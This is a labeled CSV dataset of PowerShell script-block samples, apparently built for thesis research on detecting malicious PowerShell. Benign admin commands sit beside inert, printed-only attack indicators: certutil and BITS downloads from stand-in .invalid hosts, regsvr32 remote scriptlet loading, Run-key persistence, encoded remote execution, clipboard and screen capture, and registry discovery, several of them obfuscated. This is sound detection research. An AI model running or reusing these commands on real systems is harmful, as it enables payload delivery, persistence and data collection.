id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-101,simulated_malicious,1,1,obfuscated_indicator,certutil_transfer_decode_base64_literal_decode_safe,certutil_transfer_decode,positive:certutil_transfer_decode,Source-derived inert offensive behavior pattern,Defense Evasion,Deobfuscate/Decode Files or Information,T1140,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,e1f243b8-d8b8-48b8-8a4b-2a9df77feda7,19546b36ca0ac8328bf00c7611e0f6193f04598ea06196e3137d70fa145e0f29,$encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,16,+2:category_download;+2:category_defense_evasion;+2:category_lolbin;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,602,1,10,25,0.041528,0.039867,0.004983,4.844091,1,0,480,1,480,1,0,0,0,0,0,2,FromBase64String;YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2,2,3,1,5,1,1,1,1,1,1,1,1,0
PST-102,benign,0,0,normal_benign,csv_formatting_normal_v2,csv_formatting_normal,benign:csv_formatting_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,e96daaae-4cc2-4b2a-80a6-aa572cb90b54,7b6ab853c04dfed7de2aeeab27e5e64d77feac1357a5f6c387105e322270b0a4,"Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'",2,+1:category_discovery;+1:irregular_case,1,1,91815,4,4,Powershell executing process discovery,113,1,12,12,0.106195,0.017699,0.115044,4.734314,1,1,16,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-103,simulated_malicious,1,1,obfuscated_indicator,powershell_remoting_base64_literal_decode_safe,powershell_remoting,positive:powershell_remoting,Source-derived inert offensive behavior pattern,Lateral Movement,Windows Remote Management,T1021.006,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,eaeaedb0-9114-46c1-aca4-7c59d189e980,268fd486d66965f41ca1d485d630a763b32ef12578e8fcf4d35ad23925c43a6e,$encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,15,+2:category_execution;+2:category_defense_evasion;+1:category_remote_execution;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,610,1,10,25,0.040984,0.027869,0.004918,4.703686,1,0,488,1,488,1,0,0,0,0,0,1,FromBase64String,2,encodedcommand;scriptblock,0,2,2,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,0,2,2,0,,0,0,0,3,3,1,5,4,4,4,6,1,5,1,1,1,1,1,1,1,1,0
PST-104,simulated_malicious,1,1,clear_indicator,rundll32_proxy_execution_clear,rundll32_proxy_execution,positive:rundll32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Rundll32,T1218.011,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,baf587ee-37b2-44b7-a32f-1922ea60091b,92e4c83754be17812057ca795f71baf7e851ddc5c10a294f34375bea641146c1,"$indicator='rundll32.exe C:\__THESIS_INERT__\stage.dll,EntryPoint'; Write-Output $indicator",2,+2:category_lolbin,0,0,,,0,,91,1,7,18,0.197802,0.021978,0.032967,4.990068,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-105,benign,0,0,hard_benign,hard_regex_log_scan_v1,hard_regex_log_scan,benign:hard_regex_log_scan,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,88239602-f4f0-4e2a-98e7-0064230d43a7,a4a8692152bd9585d9c15d481b56aec994ed02006b6c2b4bc63c2ca25f5e4eb8,"$line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\w+|status=\w+') | ForEach-Object Value",1,+1:irregular_case,0,0,,,0,,129,1,18,29,0.224806,0.062016,0.085271,5.08623,2,0,67,0,0,0,0,0,0,0,0,1,ForEach-Object,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-106,benign,0,0,hard_benign,hard_many_punctuation_v1,hard_many_punctuation,benign:hard_many_punctuation,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,200cd131-b9d8-4f8b-a83e-869ecb29d764,cbf62895087b7293726e0a07f489f777e9074e6122764eb9667936470b5d5152,$s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s,0,,0,0,,,0,,82,1,13,20,0.243902,0.04878,0.04878,4.652083,1,0,58,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-107,benign,0,0,normal_benign,timezone_normal_v1,timezone_normal,benign:timezone_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,e784965c-62eb-496b-abc9-aab966827dc8,33c55ab6522e67f6e0a233e8b9bebc5b23ea1ba62e737d38dd32dcb61ce523f8,"Get-TimeZone | Select-Object Id, DisplayName",1,+1:irregular_case,0,0,,,0,,44,1,4,4,0.090909,0.0,0.090909,4.450196,0,0,0,0,0,0,0,0,0,0,0,1,Get-TimeZone,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-108,benign,0,0,normal_benign,bios_inventory_normal_v2,bios_inventory_normal,benign:bios_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12,7858390a06d597cbf6989a41822351c0e2324daa5f4748207cd6ac6d78c906d9,"Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'",2,+1:category_discovery;+1:irregular_case,0,0,,,0,,102,1,9,9,0.088235,0.029412,0.088235,4.642152,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-109,benign,0,0,normal_benign,event_provider_normal_v2,event_provider_normal,benign:event_provider_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,00d0982d-a8b5-4d2b-b8fa-44bb1702c23f,1ed61af6b2843920ad7b0ec61de6c9b97a327c0329892c0421ef855980296a65,"Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,119,1,10,11,0.092437,0.008403,0.084034,4.762618,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-110,simulated_malicious,1,1,obfuscated_indicator,bits_transfer_mixed_case,bits_transfer,positive:bits_transfer,Source-derived inert offensive behavior pattern,Defense Evasion,BITS Jobs,T1197,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,f72fd631-62aa-4aca-9c1e-0ce1a9780920,49e25a6724eb1714263ac87b611df1c9d946154b49e5994d9e12265e3428dd2b,$indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\caChe.bin'''; Write-Output $indicator,3,+2:category_download;+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,146,1,11,29,0.19863,0.0,0.041096,5.121624,1,0,104,0,0,0,0,0,0,0,0,4,BiTS.ExaMpLE.InvaLiD;DeSTiNAtiON;STaRT-bITStrANSFER;pAylOAD.BiN,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,0,5,0,1,0,1,1,0,0,0,0
PST-111,simulated_malicious,1,1,obfuscated_indicator,regsvr32_proxy_execution_mixed_case,regsvr32_proxy_execution,positive:regsvr32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Regsvr32,T1218.010,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,5d3663db-b63e-4bfd-88ad-280735821991,0921cd4a1126b6e207261bdf9bb3dfa7c0f019b7af8033088f6b0344dbdd803f,$indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator,3,+2:category_lolbin;+1:irregular_case,0,0,,,0,,107,1,12,21,0.196262,0.018692,0.065421,5.101673,1,0,69,0,0,0,0,0,0,0,0,1,ReG.ExAmpLe.inVAliD,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,0,1,0,0,0,0,0,0,0
PST-112,simulated_malicious,1,1,obfuscated_indicator,registry_run_key_mixed_case,registry_run_key,positive:registry_run_key,Source-derived inert offensive behavior pattern,Persistence,Registry Run Keys / Startup Folder,T1547.001,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d5a9cfed-489a-47df-9875-8e6cbb65e7f3,ebca1d9f568bddae5db228117c9c1c6ad60ae027e4ab73394793f73d1b342144,$indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\soFTwaRE\MIcrOsofT\wiNDows\curRENTVersIoN\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\__ThEsIS_IneRT__\sTaGE.PS1'''; Write-Output $indicator,7,+2:category_execution;+2:category_persistence;+2:multiple_high_risk_categories;+1:irregular_case,1,1,91844,12,12,Possible addition of new item to Windows startup registry,220,1,16,41,0.186364,0.004545,0.054545,5.28904,1,0,176,0,0,0,0,0,0,0,0,7,MIcrOsofT;ThEsIS_IneRT__;curRENTVersIoN;nEW-iTeMpROPerTy;powErsHelL.eXe;upDAteChecK;wINdOWsTYLe,1,windowstyle hidden,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0,1,5,1,5,1,1,1,1,1,1,1,1,1
PST-113,simulated_malicious,1,1,clear_indicator,screen_capture_clear,screen_capture,positive:screen_capture,Source-derived inert offensive behavior pattern,Collection,Screen Capture,T1113,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,4371e8ae-bb5b-4300-9ddb-737bdddd4d02,15c38532d064735226769ddd6f6ae7b17f2fd0d8769b51f9dae60a1708106852,"$indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator",2,+1:category_collection;+1:irregular_case,1,1,91803,14,14,Screen capture method invoked from PowerShell script.,114,1,12,25,0.219298,0.035088,0.017544,5.02488,1,0,76,0,0,0,0,0,0,0,0,1,CopyFromScreen,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0,0,4,0,5,0,1,0,1,1,1,1,1,1
PST-114,simulated_malicious,1,1,obfuscated_indicator,clipboard_collection_combined_obfuscation,clipboard_collection,positive:clipboard_collection,Source-derived inert offensive behavior pattern,Collection,Clipboard Data,T1115,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,ce518e27-f1ba-46c7-b276-514b4ecbd3b2,0ebfd40258a5d925b06f425e200764b9447f8ecd134312700395359006e04429,"$parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator",9,+1:category_collection;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,139,1,18,51,0.366906,0.0,0.064748,4.86447,10,9,48,0,0,0,3,0,1,0,0,1,rTTo-Js,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-115,benign,0,0,hard_benign,hard_scheduled_task_read_filter_v2,hard_scheduled_task_read_filter,benign:hard_scheduled_task_read_filter,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,fe48bdf8-2a54-4a39-a00c-1b5f689a117f,90f66f734ae46d54c95e3a121e9f2377362537132461ddc26e912c517bdc0542,"Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'",0,,0,0,,,0,,167,1,17,17,0.101796,0.011976,0.107784,4.759533,2,1,29,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-116,benign,0,0,hard_benign,hard_firewall_read_filter_v1,hard_firewall_read_filter,benign:hard_firewall_read_filter,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,742c99e0-cae1-4292-ab58-85761324f6b4,d75eec88bdffe13760c2ae6a639cbd96e92832187ccadaf37b01ac05c4f86160,"Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction",1,+1:irregular_case,0,0,,,0,,131,1,12,11,0.083969,0.007634,0.099237,4.644485,1,1,4,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-117,benign,0,0,normal_benign,service_running_filter_normal_v2,service_running_filter_normal,benign:service_running_filter_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,3f3ee02a-fd51-4446-ad9f-d3cba8717bbc,2217be192ba876496b26a27723d1315b2374e0c422b8e679a3710e8ab443e35d,"Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'",0,,0,0,,,0,,118,1,14,14,0.118644,0.016949,0.127119,4.472154,2,2,23,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-118,benign,0,0,normal_benign,power_plan_read_normal_v1,power_plan_read_normal,benign:power_plan_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,edd276e0-7122-4b23-a980-2bec139d4cb2,96fc17ff3db2a49c8c81eecffaf64eb749ee138dd089cf8c5aca7fd76cc286d7,powercfg /L,0,,0,0,,,0,,11,1,2,1,0.090909,0.0,0.090909,3.459432,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-119,benign,0,0,hard_benign,hard_xml_processing_v2,hard_xml_processing,benign:hard_xml_processing,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,f0d2f4ba-64a5-4122-965a-3983df454beb,937e8081ea8572195ac65966bdc265aa6fff0e9813037b8abf6cc7cfdb255fb7,"[xml]$xml = '<inventory><host name=""ws-01""><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'",0,,0,0,,,0,,145,1,17,34,0.234483,0.02069,0.062069,4.814075,2,0,87,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-120,simulated_malicious,1,1,obfuscated_indicator,registry_discovery_base64_literal_decode_safe,registry_discovery,positive:registry_discovery,Source-derived inert offensive behavior pattern,Discovery,Query Registry,T1012,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,fb546f54-1b5a-4f17-9911-bfabbce2e6c7,35edd5ecd8c960c6d80410833a91e3ddb1ebf7f821ff738a125af694f758bdfb,$encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,11,+2:category_defense_evasion;+1:category_discovery;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,346,1,10,25,0.072254,0.023121,0.008671,5.043671,1,0,224,1,224,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,1,2,1,1,2,1,1,2,3,1,5,1,1,1,1,1,1,1,1,0
PST-121,simulated_malicious,1,1,obfuscated_indicator,registry_discovery_string_concatenation,registry_discovery,positive:registry_discovery,Source-derived inert offensive behavior pattern,Discovery,Query Registry,T1012,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,8694f25b-9c8b-47d2-a04e-6d4a85e2b05e,7bfeec2b5707e77a27895cb593b69be5dcc6d94180ef4f64dc67263299bc61cd,$indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\Softw' + 'are\Microso' + 'ft\Win' + 'dows\Curre' + 'ntVersion\Uni' + 'nstall\*'''; Write-Output $indicator,7,+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,169,1,15,48,0.284024,0.0,0.130178,4.560807,10,10,84,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0,2,3,1,5,1,1,0,0,0,0,0,0,0
